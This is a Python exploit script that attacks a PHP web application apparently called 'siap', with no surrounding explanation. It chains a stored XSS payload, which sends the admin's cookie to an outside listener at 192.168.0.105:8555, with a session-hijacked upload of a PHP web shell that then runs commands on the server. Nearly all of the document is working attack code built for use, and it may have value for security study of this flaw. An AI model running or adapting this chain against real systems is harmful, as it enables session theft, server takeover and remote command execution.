# Chaining XSS -> File Upload
import requests, socket, urllib.parse as parse

upload_url = 'http://localhost/siap/admin/tambahKP.php'
shell_url = 'http://localhost/siap/image/koleksi/union.php?1=whoami'
session = requests.session()
headers = {'Content-Type':'application/x-www-form-urlencoded'}

def register_user(username, password):
    register_url = 'http://localhost/siap/daftarNA.php'
    body_data = f"username={username}&password={password}&nama_user=it&level=non-anggota&daftar=Daftar"
    r = requests.post(register_url, data=body_data, headers=headers)
    if 'Berhasil Daftar !' in r.text:
        print('[+] User created!')
    else:
        print('[-] Uh something wrong')

def login_user(username,password):
    login_url = 'http://localhost/siap/cekanggota.php'
    body_data = f'username={username}&password={password}&login=Login'
    r = session.post(login_url, data=body_data, headers=headers)
    print(r.headers)

def send_xss():
    saran_url =  'http://localhost/siap/komen_saran.php'
    xss_payload = '<script>var i=new Image;i.src="http://192.168.0.105:8555/?"+document.cookie;</script>'
    enc_payload = parse.quote(xss_payload)
    body_data = f'saran={enc_payload}'
    r = session.post(saran_url, data=body_data, headers=headers)
    if 'Berhasil Dikirim !' in r.text:
        print('[+] Success send XSS')
    else:
        print('[-] Uh something wrong')

def setup_socket():
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('192.168.0.105', 8555))
    sock.listen()
    print('[i] Listening on port 8555')
    (sock_c, ip_c) = sock.accept()
    get_request = sock_c.recv(4096)
    split_req = get_request.split(b" HTTP")[0][6:].decode("UTF-8")
    cookie = split_req.split('=')
    cookie = cookie[1]
    return cookie

login_user('john','1337')
send_xss()
print("[i] Waiting admin trigger our XSS")
sessid = setup_socket()

cookie = {'PHPSESSID':sessid}

pshell = '<?=`$_GET[1]`?>'

form_data = {
    'judul': (None, 'KP-EvilShell'),
    'penulis': (None,'Ardias'),
    'nim': (None,'1337'),
    'jurusan': (None,'Teknik Sipil'),
    'dosbimKP': (None, ' RDX'),
    'dosbimKP1': (None, 'ARDX'),
    'subjek': (None, 'YesSir'),
    'barcode': (None, '1337'),
    'accno': (None, '1337'),
    'laporan': ('bad.php', pshell, 'application/x-php'),
    'simpan': (None, 'Tambah')
}

print('[i] Upload Shell')
r = requests.post(url=upload_url, files=form_data, cookies=cookie)
if 'Berhasil Ditambahkan !' in r.text:
    print('[+] File Uploaded!')
else:
    print('[-] Failed to upload :(')

print(f'[i] Accessing Shell url in: {shell_url}')
r = requests.get(url=shell_url)
print('Resp:',r.text)
